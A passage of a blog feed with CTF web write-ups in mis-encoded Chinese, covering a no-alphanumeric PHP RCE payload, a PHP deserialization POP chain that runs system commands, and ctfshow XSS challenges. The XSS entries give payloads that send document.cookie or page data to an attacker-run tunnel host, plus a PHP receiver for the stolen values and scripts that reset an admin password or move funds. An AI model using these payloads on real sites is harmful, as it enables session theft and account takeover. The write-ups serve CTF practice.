alt="image-20230115172921998"></p><p>ä¸€é“<strong>æ— æ•°å­—å­—æ¯çš„rce</strong>  (å¤§å†™å­—æ¯å…¶å®å¯ä»¥ä¸åŠ )(ç‹—å¤´)</p><p>ç›´æ¥ä¸Šç½‘æ‰¾å°±è¡Œäº†ï¼Œç½‘ä¸Šæœ‰payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line"></span><br><span class="line">// å¯†ç ä¸º &quot;_&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115173206199.png" alt="image-20230115173206199"></p><p>æ‹¿åˆ°flag.</p><h3 id="EzPOP"><a href="#EzPOP" class="headerlink" title="EzPOP"></a><strong>EzPOP</strong></h3><p><img src="../images/image-20230115173342461.png" alt="image-20230115173342461"></p><p>ä¸€é“phpçš„ååºåˆ—åŒ–popé“¾çš„æ„é€ ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ€è·¯æ˜¯è¿™æ ·çš„é€šè¿‡__destruct()  -&gt;  __toString()   -&gt;__get()  -&gt;   __invoke()</span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¿™æ ·çš„ä¸€æ¡é“¾å­ï¼Œä»–çš„éš¾ç‚¹åœ¨ä¸æ€ä¹ˆä¼ å‚çš„é—®é¢˜ã€‚</p><p>è¿™ä¸ªé—®é¢˜ä¹Ÿå›°æ‰°äº†æˆ‘å¥½ä¹…</p><p>ç„¶åç»è¿‡æ¼«é•¿é•¿é•¿çš„å°è¯•ï¼Œç„¶åå°±å°è¯•æˆåŠŸäº†ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„å‡½æ•°æ¥è¿›è¡Œä¼ å‚ã€‚</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is cmd :&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$eee</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$eee</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; name -&gt; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">aa</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">bb</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="keyword">var</span>=<span class="variable">$aa</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿ç”Ÿæˆçš„é“¾å­å»æ‰“å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear"></a><strong>HappyNewYear</strong></h3><p><img src="../images/image-20230115174012742.png" alt="image-20230115174012742"></p><p>ä¸€é“ç®€å•çš„å…³äºphpç‰¹æ€§çš„é¢˜ç›®</p><p>ç»•è¿‡ç¬¬ä¸€å±‚åˆ¤æ–­å¯ä»¥åˆ©ç”¨æ•°å­—åŠ å­—æ¯çš„å½¢å¼å°±è¡Œäº†ï¼Œå­—æ¯å¿…é¡»å¾—åŠ åœ¨æ•°å­—çš„åé¢ï¼Œä¸ç„¶ä¼šè¢«åˆ¤æ–­ä¸º0ï¼›</p><p>ç¬¬äºŒå±‚åˆ¤æ–­å¯ä»¥åœ¨æœ¬åœ°æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå› ä¸ºå¯èƒ½ä¼ çš„payloadé”™äº†ï¼Œä½†ä¸çŸ¥é“æ˜¯å“ªè¾¹æ²¡è¿‡  è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>%0a</code>è¿›è¡Œç»•è¿‡ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?year=2023a&amp;key=happyNewYear%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230115174511475.png" alt="image-20230115174511475"></p><p>å‰©ä¸‹çš„javaååºåˆ—åŒ–  å’Œä¸€é“é•¿é•¿çš„ååºåˆ—åŒ–é¢˜ï¼Œç›®å‰æ°´å¹³ä¸å¤Ÿï¼Œè§£ä¸äº†äº†ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ä¸‰æ ¡è”åˆ web wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-XSS-åˆ·é¢˜è®°å½•</title>
      <link href="/posts/c697f3a9.html"/>
      <url>/posts/c697f3a9.html</url>
      
        <content type="html"><![CDATA[<p><strong>å…¶å®XSSæœ‰å¾ˆå¤šè¯­å¥çš„çš„ï¼Œå¦‚æœåšé¢˜çš„æ—¶å€™è¢«è¿‡æ»¤äº†çš„è¯ï¼Œå¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« ä¸‹æ‰¾ï¼Œè¿™ç¯‡æ–‡ç« å°±ä¸ºäº†ç”¨æ¥è®°å½•xssçš„payloadçš„</strong></p><p><strong>XSSæ¼æ´å¸¸è§ç±»å‹ åå°„å‹ï¼šäº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨æ•°æ®åº“é‡Œé¢ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ï¼Œä¸€èˆ¬å‡ºç°åœ¨æŸ¥è¯¢ç±»é¡µé¢ï¼›(éœ€è¦åˆ«äººå»ç‚¹å‡»è‡ªå·±ä¼ªé€ çš„é“¾æ¥)    å­˜å‚¨å‹ï¼šäº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨æ•°æ®åº“é‡Œé¢ï¼Œæ°¸ä¹…æ€§å­˜å‚¨ï¼Œä¸€èˆ¬å‡ºç°åœ¨ç•™è¨€æ¿ã€æ³¨å†Œç­‰é¡µé¢ï¼›(ç®¡ç†å‘˜è®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ)   DOMå‹ï¼šä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’ï¼Œæ˜¯ä¸€ç§é€šè¿‡DOMæ“ä½œå‰æ®µä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜ï¼Œä¸€æ¬¡æ€§ï¼Œä¹Ÿå±äºåå°„å‹ã€‚</strong></p><h2 id="web316-åå°„å‹"><a href="#web316-åå°„å‹" class="headerlink" title="web316(åå°„å‹)"></a>web316(åå°„å‹)</h2><p>è¿™é‡Œç”±äºæ‡’å¾—èŠ±é’±å»ævps(å½“ç„¶ä¹Ÿæ²¡å»å­¦å’‹æâ€¦)æ‰€ä»¥è¿™é‡Œå°±ç”¨ä¸€ä¸ªå†…ç½‘æ¸—é€çš„å·¥å…·å»æ(cpolar)</p><p>å…·ä½“æ€ä¹ˆç”¨å¯ä»¥è‡ªå·±å»ç½‘ä¸Šå»æ‰¾ï¼Œå¾ˆç®€å•çš„  <a href="https://blog.51cto.com/u_13540373/5760290">ç‚¹å‡»è¿™é‡Œï¼Œè¿™ç¯‡æ–‡ç« å¯ä»¥æ•™ä½ å¦‚ä½•æ“ä½œ</a></p><p>éœ€è¦éƒ¨ç½²åœ¨æœ¬åœ°çš„phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$flag</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼š<strong>å°±æ˜¯æ¥æ”¶getä¼ é€’è¿›æ¥çš„å‚æ•°ï¼Œå¹¶å†™åœ¨flag.txté‡Œ</strong></p><p>å› ä¸ºæˆ‘è¿™é‡Œçš„phpä»£ç æ˜¯æ”¾åœ¨phpstudyçš„wwwç›®å½•ä¸‹ï¼Œåˆ°æ—¶å€™ç›´æ¥å»wwwç›®å½•ä¸‹çœ‹å°±å¥½äº†ã€‚</p><p><img src="../images/image-20230118143203368.png" alt="image-20230118143203368"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”Ÿæˆçš„ç½‘å€çš„è¯ï¼Œcpolarä¼šè‡ªå·±ç»™ä½ éšæœºç”Ÿæˆçš„ï¼Œåˆ°æ—¶å€™è‡ªå·±è¿›è¡Œæ›´æ¢å°±å¥½äº†ã€‚</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118143557955.png" alt="image-20230118143557955"></p><p><strong>è¿‡æ»¤äº†script</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118143720453.png" alt="image-20230118143720453"></p><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118143810781.png" alt="image-20230118143810781"></p><p><strong>è¿‡æ»¤äº†img</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118144111539.png" alt="image-20230118144111539"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118144333194.png" alt="image-20230118144333194"></p><p><strong>è¿™éƒ½è¿‡æ»¤äº†ç©ºæ ¼</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web327-å­˜å‚¨å‹"><a href="#web327-å­˜å‚¨å‹" class="headerlink" title="web327(å­˜å‚¨å‹)"></a>web327(å­˜å‚¨å‹)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118150350661.png" alt="image-20230118150350661"></p><p>æ”¶ä»¶äººå¿…é¡»å¡«adminï¼Œå…¶ä»–çš„å¯ä»¥éšä¾¿å¡«</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=&quot;window.location.href=&#x27;http://77c9e44.r8.cpolar.top/1.php?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>æºç </p><p><img src="../images/image-20230118150649147.png" alt="image-20230118150649147"></p><p>è¿™ä¸ªé¢˜æ¯”è¾ƒç»•ï¼Œè§£æ³•æ˜¯å…ˆè¿›è¡Œé¡µé¢æ³¨å†Œï¼ŒæŠŠjsä»£ç æ³¨å…¥åå°ï¼Œç„¶åç®¡ç†å‘˜è®¿é—®çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘jsä»£ç ï¼ŒæŠŠç®¡ç†å‘˜çš„cookieè¿”å›åˆ°æˆ‘ä»¬æœ¬åœ°.</p><p>(è¿™é‡Œå°±æ˜¯åˆ©ç”¨æ³¨å†Œçš„æ—¶å€™æ³¨å†Œjsä»£ç ï¼Œç­‰ç®¡ç†å‘˜è®¿é—®çš„æ—¶å€™å°±ä¼šè§¦å‘ä»£ç ï¼Œç„¶åè¿”å›ç®¡ç†å‘˜çš„cookie)</p><p>è¿™é‡Œçš„è¯<strong><body></strong>ç”¨ä¸äº†</p><p>æˆ‘ä»¬æ¢æˆ<script></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118152652575.png" alt="image-20230118152652575"></p><p>æ‹¿åˆ°äº†ç®¡ç†å‘˜çš„cookieå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹ï¼Œå› ä¸ºæˆ‘ä»¬å•çº¯ä¿®æ”¹cookieçš„è¯ï¼Œç¬¬ä¸€ä¸ªé¡µé¢ä¼šé»˜è®¤æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ï¼Œçœ‹ä¸äº†flagï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æŠ“å¦ä¸€ä¸ªåŒ…ã€‚</p><p><img src="../images/image-20230118212607420.png" alt="image-20230118212607420"></p><p>æˆåŠŸæ‹¿åˆ°flagï¼ŒæŠ“åŒ…çš„æ—¶å€™è¦è®°å¾—æ”¾æ‰ç¬¬ä¸€ä¸ªåŒ…ï¼Œå¾—æŠ“ç¬¬äºŒä¸ªã€‚</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118212824093.png" alt="image-20230118212824093"></p><p>è¿™é“é¢˜çš„è¯æ˜¯ç®¡ç†å‘˜cookieä¼šä¸€ç›´åœ¨å˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸èƒ½åˆ©ç”¨ç®¡ç†å‘˜cookieç™»å½•äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æ¢ä¸€ä¸ªæ–¹æ³•äº†ã€‚</p><p><img src="../images/image-20230118220105619.png" alt="image-20230118220105619"></p><p>æ‹¿åˆ°äº†å­˜è´®è¿™ä¸ªç±»çš„é¡µé¢</p><p><img src="../images/image-20230118220134350.png" alt="image-20230118220134350"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»éå†äº†ï¼Œ(è¿™é‡Œåˆ©ç”¨çš„æ˜¯å‰ç«¯çš„è¯­å¥ï¼Œæˆ‘ä¹Ÿä¸å¤ªä¼šï¼Œæ²¡å­¦è¿‡)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JS indexof æ–¹æ³•https://www.w3school.com.cn/jsref/jsref_indexOf.asp</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)==0)&#123;</span><br><span class="line">        window.location.href=&#x27;http://33d37750.r7.cpolar.top/1.php?c=&#x27;+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230118220445638.png" alt="image-20230118220445638"></p><p>æœ€åå°†ä¸Šé¢çš„payloadè¿›è¡Œæ³¨å†Œç™»å½•å°±èƒ½æ‹¿åˆ°flagäº†(è¿™é‡Œæ˜¯åˆ©ç”¨å‰ç«¯çš„è¯­å¥æ¥è·å–çš„)</p><h2 id="web330-GET"><a href="#web330-GET" class="headerlink" title="web330(GET)"></a>web330(GET)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118220652986.png" alt="image-20230118220652986"></p><p>è¿™ä¸ªå¤šäº†ä¸ªä¿®æ”¹å¯†ç çš„åŠŸèƒ½(é‚£è‚¯å®šæ˜¯æ‹¿è¿™ä¸ªä¿®æ”¹å¯†ç æ¥åšæ–‡ç« äº†)</p><p>è¿™é‡Œçš„æ€è·¯æ˜¯åŒè¿‡ç»™ç®¡ç†å‘˜è´¦æˆ·ä¿®æ”¹å¯†ç ï¼Œç„¶åé€šè¿‡æ–°ä¿®æ”¹çš„å¯†ç ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œç„¶åæ‹¿åˆ°flagå°±okäº†ã€‚</p><p>ä½†æ˜¯è¿™é‡Œåœ¨å“ªè§¦å‘scriptå°±å¾ˆè¿·ï¼Œç»è¿‡æµ‹è¯•ï¼Œå‘ç°åœ¨ç”¨æˆ·åè¿™é‡Œå¯ä»¥è¿›è¡Œè§¦å‘ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„127.0.0.1æ˜¯ç®¡ç†å‘˜çš„è´¦æˆ·ï¼Œåé¢çš„<code>/api/change.php?p=123</code>æ˜¯ä¿®æ”¹å¯†ç æ—¶çš„é¡µé¢ï¼Œå¯ä»¥è‡ªå·±å»æŠ“ä¸ªåŒ…çœ‹çœ‹ã€‚(è¿™é‡Œå°±æ˜¯æŠŠç®¡ç†å‘˜çš„å¯†ç ç»™ä¿®æ”¹ä¸º123)</p><p><strong>è¿™é‡ŒæŸ¥çœ‹ç”¨æˆ·ç®¡ç†çš„æ—¶å€™è¦è¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹ï¼Œå› ä¸ºè¿™ä¸ªä¼šä¸€é—ªè€Œè¿‡ï¼Œçœ‹ä¸äº†ã€‚</strong></p><h2 id="web331-POST"><a href="#web331-POST" class="headerlink" title="web331(POST)"></a>web331(POST)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118224424779.png" alt="image-20230118224424779"></p><p>è¿˜æ˜¯è¿™æ ·å­(è¿˜æ˜¯é€šè¿‡ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç è¿™ä¸ªæ–¹æ³•æ¥è¿›è¡Œè·å–flag)</p><p>ä½†æ˜¯è¿™é‡Œæ”¹æˆPOSTæäº¤äº†ï¼Œæˆ‘ä»¬å¾—æ¢ä¸€ä¸‹paylaod</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="web332-GET"><a href="#web332-GET" class="headerlink" title="web332(GET)"></a>web332(GET)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118225058977.png" alt="image-20230118225058977"></p><p>æ–°å¢åŠ äº†å‡ ä¸ªåŠŸèƒ½</p><p>æ€è·¯</p><p>å°±æ˜¯åˆ©ç”¨è¿™é‡Œé¢çš„é€»è¾‘æ¼æ´ï¼Œå°±æ˜¯æƒ³ç®¡ç†å‘˜è´¦å·è½¬è´¦-10000,ç„¶åè‡ªå·±å°±ä¼šåŠ é’±ï¼Œè½¬æ­£çš„ä¼šå‡é’±ï¼Œå¯ä»¥è‡ªå·±å»å°è¯•ã€‚</p><p>ç„¶åè½¬è´¦æˆåŠŸå°±å»ä¹°flagå°±è¡Œäº†ã€‚</p><h2 id="web333-POST"><a href="#web333-POST" class="headerlink" title="web333(POST)"></a>web333(POST)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230118231027106.png" alt="image-20230118231027106"></p><p>è¿™é“é¢˜çš„è¯å°±ä¸èƒ½å»è¿›è¡Œè½¬è´¦è´Ÿé‡‘é¢äº†ï¼Œ(åŒæ—¶è¿™é‡Œä¹Ÿä¿®æ”¹æˆäº†POST)</p><p><strong>è§£æ³•ä¸€</strong></p><p>è¿™é‡Œçš„è¯æ˜¯é€šè¿‡æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç»™è‡ªå·±è½¬è´¦ï¼Œåªè¦é‡‘é¢ä¸è¶…è¿‡è‡ªèº«æ‹¥æœ‰çš„å°±è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„å­˜æ¬¾å°±å¯ä»¥å¢åŠ ï¼Œç„¶åå°±å¯ä»¥ä¹°åˆ°flagäº†ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p><img src="../images/image-20230118232026586.png" alt="image-20230118232026586"></p><p>poståŒ…çš„å†…å®¹å˜äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»ä¿®æ”¹ä¸€ä¸‹payload</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;123&#x27;,a:&#x27;10000&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>â€‹                 <strong>uæ˜¯è½¬è´¦çš„è´¦æˆ·å  aæ˜¯è½¬è´¦çš„é‡‘é¢</strong></p><p>æ€è·¯</p><p>(è¿™é“é¢˜çš„è§£æ³•æ˜¯é€šè¿‡ç®¡ç†å‘˜ç»™è‡ªå·±è½¬è´¦ï¼Œå°±æ˜¯å…ˆè‡ªå·±æ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åä¿®æ”¹payloadï¼ŒæŠŠè‡ªå·±çš„ç”¨æˆ·åå’Œéœ€è¦è½¬çš„é‡‘é¢åŠ è¿›å»ï¼Œç„¶ååœ¨æ‹¿å»æ³¨å†Œï¼Œç„¶åç­‰ç®¡ç†å‘˜å»è®¿é—®ç®¡ç†é¡µé¢ï¼Œjsä»£ç å°±ä¼šæ‰§è¡Œï¼Œç„¶åå°±ä¼šåƒæˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·è½¬é’±ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç™»å½•æˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·å°±å¯ä»¥çœ‹åˆ°è½¬æ¥çš„é’±äº†ï¼Œç„¶ååœ¨æ‹¿å»ä¹°flagå°±è¡Œäº†)</p><p>åˆ°æ­¤ï¼Œxssæä¸€æ®µè½äº†</p><p>(å…¶å®è¿˜æœ‰å¾ˆå¤š<strong>XSS</strong>çš„æ¡†æ¶æ²¡ç”¨åˆ°ï¼Œä»¥ååšé¢˜çš„æ—¶å€™å¯ä»¥å‡ºæœæ¥ç”¨ç”¨)</p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ååºåˆ—åŒ– åˆ·é¢˜è®°å½•</title>
      <link href="/posts/fd5983bb.html"/>
      <url>/posts/fd5983bb.html</url>
      
